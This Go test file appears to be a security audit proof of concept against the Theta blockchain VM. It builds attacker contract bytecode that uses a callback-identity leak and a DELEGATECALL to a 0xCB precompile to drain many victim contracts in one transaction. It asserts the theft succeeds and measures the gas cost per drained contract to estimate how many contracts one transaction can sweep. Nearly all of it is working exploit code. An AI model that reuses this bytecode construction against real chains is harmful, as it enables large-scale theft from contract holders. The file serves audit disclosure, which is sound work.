package vm

// AUDIT PoC C - the multiplier: ONE transaction drains N contracts.
//
// The callback-identity leak (PoC B) gives the attacker's contract the identity
// of whichever contract just called it. That identity is per-frame, so the
// attacker contract can walk a list of victims inside a single transaction:
//
//	attacker EOA --tx--> C  (frame C, CallerAddress = attacker)
//	                      C -> CALL V1        (frame V1, CallerAddress = C)
//	                            V1 -> CALL msg.sender (= C)   (frame C', CallerAddress = V1)
//	                                  C' -> DELEGATECALL 0xCB  => debits V1
//	                      C -> CALL V2 ... and so on
//
// Cost per victim is ~21.7k gas (DELEGATECALL 700 + ThetaTransferGas 21000 +
// memory), i.e. hundreds of contracts drained per 20M-gas transaction.

import (
	"encoding/hex"
	"fmt"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
)

func push20hex(a common.Address) string { return "73" + hex.EncodeToString(a.Bytes()) }

// sweepContract builds the attacker contract that both initiates the calls and
// performs the drain when re-entered.
//
//	CALLER == entry  -> JUMPI LOOP
//	fallthrough      -> <drainer: delegatecall 0xCB with the CALLER's balance>  (re-entry path)
//	LOOP             -> CALL each victim; STOP                                  (entry path)
func sweepContract(entry common.Address, victims []common.Address, credit common.Address) []byte {
	var b []byte
	app := func(h string) {
		d, err := hex.DecodeString(h)
		if err != nil {
			panic(err)
		}
		b = append(b, d...)
	}
	drain, err := hex.DecodeString(drainerRuntime(credit))
	if err != nil {
		panic(err)
	}

	app("33" + push20hex(entry) + "14") // CALLER == entry ?
	loopOffPos := len(b)
	app("610000") // PUSH2 <loop offset>, patched below
	app("57")     // JUMPI

	// re-entry path: drain the frame's CallerAddress (the victim that called us)
	b = append(b, drain[:len(drain)-1]...) // drainer without its trailing STOP
	app("00")                              // STOP

	loopOffset := len(b)
	b[loopOffPos+1] = byte(loopOffset >> 8)
	b[loopOffPos+2] = byte(loopOffset)

	app("5b") // JUMPDEST
	for _, v := range victims {
		// CALL(gas, victim, value=0, in=0, out=0)
		app("6000" + "6000" + "6000" + "6000" + "6000" + push20hex(v) + "5a" + "f1" + "50")
	}
	app("00") // STOP
	return b
}

func TestAuditC_OneTxDrainsManyContracts(t *testing.T) {
	sv := newAuditView(t)

	const n = 6
	const perVictimTheta = 1000 // THETA in each victim contract

	victims := make([]common.Address, n)
	for i := 0; i < n; i++ {
		v := common.HexToAddress(fmt.Sprintf("0x%040x", 0xA00000+i))
		victims[i] = v
		setBalance(t, sv, v, thetaN(perVictimTheta), big.NewInt(0))
		setCode(t, sv, v, victimCallbackToSender()) // "call back to msg.sender"
	}

	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
	sv.SetCode(attackerCtr, sweepContract(attackerEOA, victims, attackerEOA))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	before := new(big.Int).Set(thetaOf(sv, attackerEOA))

	_, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 5_000_000, big.NewInt(0), big.NewInt(0))
	if err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	total := big.NewInt(0)
	for i, v := range victims {
		t.Logf("victim[%d] %v : theta = %v", i, v.Hex(), thetaOf(sv, v))
		total.Add(total, thetaOf(sv, v))
		if thetaOf(sv, v).Sign() != 0 {
			t.Fatalf("victim %d not drained", i)
		}
	}
	gained := new(big.Int).Sub(thetaOf(sv, attackerEOA), before)
	t.Logf("attacker gained in ONE transaction: %v thetaWei (%v THETA)", gained, new(big.Int).Div(gained, big.NewInt(1e18)))
	if gained.Cmp(thetaN(n*perVictimTheta)) != 0 {
		t.Fatalf("expected %v, got %v", thetaN(n*perVictimTheta), gained)
	}
}

// TestAuditC2_GasBudget measures the marginal gas per drained contract, which
// determines how many contracts can be swept inside one 20M-gas transaction.
func TestAuditC2_GasBudget(t *testing.T) {
	measure := func(n int) uint64 {
		sv := newAuditView(t)
		victims := make([]common.Address, n)
		for i := 0; i < n; i++ {
			v := common.HexToAddress(fmt.Sprintf("0x%040x", 0xB00000+i))
			victims[i] = v
			setBalance(t, sv, v, thetaN(1), big.NewInt(0))
			setCode(t, sv, v, victimCallbackToSender())
		}
		setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
		sv.SetCode(attackerCtr, sweepContract(attackerEOA, victims, attackerEOA))
		setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

		tx := smartTx(attackerEOA, attackerCtr, nil, 20_000_000)
		ret, _, gasUsed, err := Execute(NewBlockInfo(auditHeight, big.NewInt(1), "mainnet"), tx, sv)
		_ = ret
		if err != nil {
			t.Fatalf("tx failed for n=%d: %v", n, err)
		}
		return gasUsed
	}

	g2 := measure(2)
	g10 := measure(10)
	per := (g10 - g2) / 8
	t.Logf("gasUsed(n=2)=%d gasUsed(n=10)=%d -> marginal gas per drained contract = %d", g2, g10, per)
	t.Logf("contracts drainable in one 20,000,000-gas tx ~= %d (leaving headroom)", 20_000_000/per)
	t.Logf("cost per drained contract = %d gas * 4e12 TFuelWei = %v TFuelWei", per, new(big.Int).Mul(big.NewInt(int64(per)), big.NewInt(4e12)))
}
